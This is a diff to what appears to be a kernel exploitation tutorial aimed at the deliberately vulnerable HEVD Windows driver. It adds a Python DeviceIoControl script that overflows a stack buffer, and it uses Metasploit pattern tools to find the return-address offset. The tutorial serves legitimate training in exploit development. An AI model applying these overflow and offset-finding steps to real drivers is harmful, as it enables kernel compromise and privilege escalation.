@@ -147,14 +147,15 @@ if (not hevd) or (hevd == -1):
     sys.exit(1)
 
 # malicious payload
-payload = "\x41" * 3000
+payload = "A" * 0x900
+payload_ptr = id(payload) + 20
 payload_size = len(payload)
 
 # send message to the device
 kernel32.DeviceIoControl(
     hevd,               # device handle
     0x222003,           # IOCTL
-    payload,            
+    payload_ptr,            
     payload_size,       
     None,
     0,
@@ -177,8 +178,27 @@ If there are no debug messages printed in the WinDbg output, try to run below co
 ```c
 reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Debug Print Filter" /v DEFAULT /t REG_DWORD /d 0xf
 ```
+
+When we execute the script, we can observe that our breakpoint is hit and return address is overwritten by our buffer. The driver printout states also that the *UserBuffer* size is 0x800 bytes only, but we copied there 0x900 bytes of the buffer,  modifying therefore the return address and causing crash
+
 ![BP triggered](/assets/img/windbg_bp_TriggerBufferOverflowStack.png)
 ![Buffer Overflow](/assets/img/windbg_stackBO.png)
+
+Using e.g. *pattern_create* and *pattern_offset* tools from the Metasploit framework, we can find correct offset for EIP:
+
+```python
+...
+# malicious payload
+payload = "A" * 2076 + "BBBB" + "C"*224
+payload_ptr = id(payload)+20
+payload_size = len(payload)
+...
+```
+
+![Buffer Overflow](/assets/img/windbg_correct_buffer_length.png)
+
+
+
 
 ## <span class="myheader">References<span>
 
